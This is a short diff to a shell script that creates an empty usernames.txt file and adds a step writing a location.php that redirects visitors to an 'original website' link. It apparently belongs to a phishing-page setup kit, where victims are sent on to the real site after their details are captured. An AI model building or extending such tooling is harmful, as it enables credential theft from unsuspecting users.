@@ -33,6 +33,11 @@ cd $HOME/web/$website && bash Go.sh
 EOF
 cat <<EOF>usernames.txt
 EOF
+echo "Enter the original website link"
+read -r ori
+cat <<EOF>location.php
+header ('Location: $ori');
+EOF
 cd /mnt/d/web/
 rm -rf ~/web/$website
 cp -r /mnt/d/web/$website ~/web
